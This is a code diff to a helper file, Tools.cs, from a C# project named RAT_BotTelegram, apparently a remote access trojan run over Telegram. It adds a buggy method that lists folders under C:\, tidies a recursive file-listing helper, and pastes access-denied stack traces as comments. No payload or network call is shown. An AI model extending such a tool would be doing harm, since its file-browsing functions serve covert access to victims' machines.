@@ -6,6 +6,7 @@ using Microsoft.Win32;
 using System.Threading.Tasks;
 using RAT_BotTelegram.Lib;
 using System.IO;
+using Microsoft.SqlServer.Server;
 
 namespace RAT_BotTelegram.Lib {
     internal sealed class Tools {
@@ -41,16 +42,61 @@ namespace RAT_BotTelegram.Lib {
         public static string[] GetFile(string dir) {
             // Obtiene Nombre del procesador
             try {
+
                 string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
                 return allfiles;
-            } catch (Exception e ) {
-                string[] allfiles = {"[-]"};
-                Console.WriteLine("La carpeta no existe: "+e);
+            } catch (Exception e) {
+                string[] allfiles = { "[-]" };
+                Console.WriteLine("La carpeta no existe: " + e);
                 return allfiles;
+            } 
+        }
+        public static string[] GetFolder() {
+            // Obtiene Nombre del procesador
+            string[] allfiles = null;
+            int n = 0;
+            try {
+                foreach (string folder in Directory.GetDirectories(@"C:\")) {
+                    n = n + 1;
+                    allfiles[n] = folder;
+                    
+                    //Console.WriteLine("{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+                    //GetDirectoryAll(folder, indent + 2);
+                }
+            } catch (UnauthorizedAccessException) { 
             }
 
-            
+
+
+            return allfiles;
+            //try {
+            //    string[] allFolder = Directory.GetDirectories(dir);
+            //    //string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
+            //    return allFolder;
+            //} catch (Exception e) {
+            //    string[] allfiles = { "[-]" };
+            //    Console.WriteLine("La carpeta no existe: " + e);
+            //    return allfiles;
+            //}
         }
+        //    La carpeta no existe: System.UnauthorizedAccessException: Access to the path 'C:\$Recycle.Bin\S-1-5-18' is denied.
+        //   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
+        //   at System.IO.FileSystemEnumerableIterator`1.AddSearchableDirsToStack(SearchData localSearchData)
+        //   at System.IO.FileSystemEnumerableIterator`1.MoveNext()
+        //   at System.Collections.Generic.List`1..ctor(IEnumerable`1 collection)
+        //   at System.IO.Directory.GetFiles(String path, String searchPattern, SearchOption searchOption)
+        //   at RAT_BotTelegram.Lib.Tools.GetFile(String dir) in O:\OneDrive - xKx\SoftwareProyect\C#\[GitHub] RAT_BotTelegram\RAT_BotTelegram\Lib\Tools.cs:line 44
+        //La carpeta no existe: System.UnauthorizedAccessException: Access to the path 'O:\$RECYCLE.BIN\S-1-5-21-2583174595-1598790024-4181169623-1001\$RWD0RHE' is denied.
+        //   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
+        //   at System.IO.FileSystemEnumerableIterator`1.AddSearchableDirsToStack(SearchData localSearchData)
+        //   at System.IO.FileSystemEnumerableIterator`1.MoveNext()
+        //   at System.Collections.Generic.List`1..ctor(IEnumerable`1 collection)
+        //   at System.IO.Directory.GetFiles(String path, String searchPattern, SearchOption searchOption)
+        //   at RAT_BotTelegram.Lib.Tools.GetFile(String dir) in O:\OneDrive - xKx\SoftwareProyect\C#\[GitHub] RAT_BotTelegram\RAT_BotTelegram\Lib\Tools.cs:line 44
+
+
+
+        
 
     }
 }
